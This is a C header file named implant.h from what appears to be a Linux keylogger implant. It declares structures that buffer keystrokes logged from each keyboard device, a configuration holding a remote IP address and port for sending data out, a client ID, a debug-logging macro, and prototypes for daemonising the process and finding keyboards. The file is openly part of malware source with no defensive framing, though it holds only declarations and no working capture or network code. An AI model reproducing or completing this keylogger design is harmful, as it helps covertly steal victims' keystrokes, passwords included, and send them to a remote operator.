
#ifndef IMPLANT_H
#define IMPLANT_H

#include <stdint.h>
#include <sys/queue.h>
#include <sys/types.h>
#include <unistd.h>

#define QUEUE_BUFFER_SIZE 1024
#define STRING_BUFFER_SIZE 256

/*
    represents whatever data is currently logged for a single keyboard
    also holds its file descriptor
*/
typedef struct keyboard_s keyboard_t;
struct keyboard_s {
    int fd;

    uint64_t nb_chars;
    uint8_t buffer[QUEUE_BUFFER_SIZE];

    int8_t name[STRING_BUFFER_SIZE];
    TAILQ_ENTRY(keyboard_s)
    devices;
};

/*
    contains project settings, such as target
    port & IP address, whether debug mode is enabled
    or stuff like this
*/
typedef struct implant_s {

    /* remote connection settings */
    uint16_t port;
    int8_t ip[STRING_BUFFER_SIZE];
    uint8_t disable_net;

    /* keyboard settings (multiple if using dock or something) */
    TAILQ_HEAD(listhead, keyboard_s)
    kbd;

    uint8_t using_caps_lock;
} implant_t;

/* will be overriden by make rules if debug mode not enabled */
#define CLIENT_ID ("DEBUG")

#define SUCCESSFUL 1
#define ERROR 0

#include <stdio.h> /* necessary for the snprintf in the macro */
#include <syslog.h>

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...)                              \
    do {                                               \
        char data[512] = {0};                          \
        if (0 > snprintf(data, 255, s, ##__VA_ARGS__)) \
            _exit(1);                                  \
        syslog(LOG_NOTICE, data);                      \
    } while (0)
#endif

#define KEY_PRESSED 1
#define KEY_RELEASED 0

// opt.c
int run_lexer(int, char **, implant_t *);

// deamon.c
void daemon_setup(void);

// kbd.c
uint8_t fetch_available_keyboards(implant_t *instance);

// utils.c
int8_t file_get_contents(int8_t const *, int8_t **);
int8_t *remove_repeating_whitespaces(int8_t *);
uint32_t array_get_size(int8_t **);
void array_free(int8_t **);
int8_t **array_from_string(const int8_t *, int8_t);

#endif /* IMPLANT_H */
